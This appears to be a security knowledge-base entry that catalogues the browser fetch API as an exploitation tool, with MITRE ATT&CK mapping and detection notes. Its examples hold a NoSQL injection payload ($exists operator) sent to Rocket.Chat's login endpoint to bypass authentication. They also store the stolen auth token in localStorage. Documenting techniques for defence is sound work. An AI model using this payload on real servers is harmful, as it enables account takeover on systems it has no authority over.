---
url: 'https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API'
tags:
  - javascript-api
  - http-request
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:30.828Z'
id: 14747227-3c06-4554-be51-ace745e780cf
validated: true
submitted: true
---
# fetch

**Status**: Unverified

## Overview

fetch is a modern JavaScript API for making HTTP requests in browsers, used for Proof-of-Concept exploitation by sending custom payloads to endpoints like Rocket.Chat's login API.

## Description

It enables POST requests with JSON bodies and headers directly in the browser console, ideal for testing MongoDB injection without external tools. Requires POST method, Content-Type header, and handling of responses for token storage in localStorage.

## Features

- Feature 1: Promise-based asynchronous requests
- Feature 2: Support for headers, methods, and body payloads
- Feature 3: JSON parsing of responses

## Installation

### Requirements

- Modern browser supporting ES6+

### Install Commands

```bash
# Built-in; no install needed
```

## Basic Usage

```javascript
fetch(url).then(r => r.text()).then(console.log);
```

### Common Options

| Option | Description |
|--------|-------------|
| method: 'POST' | Specify HTTP method |
| headers | Custom headers object |
| body | Request body (JSON.stringify) |

## Examples

### Example 1: Basic Usage

```javascript
fetch('/api/v1/login', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({loginToken: {$exists: false}})}).then(r => r.json()).then(console.log);
```

### Example 2: Advanced Usage

```javascript
fetch('/api/v1/login', {...}).then(r => r.json()).then(data => { localStorage.setItem('authToken', data.authToken); location.reload(); });
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Console logs or CSP blocks on fetch to internal APIs
- Anomalous JavaScript executions on login pages

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Web-Inspector]]
- [[tools/curl]]

## References

- Official documentation: https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API
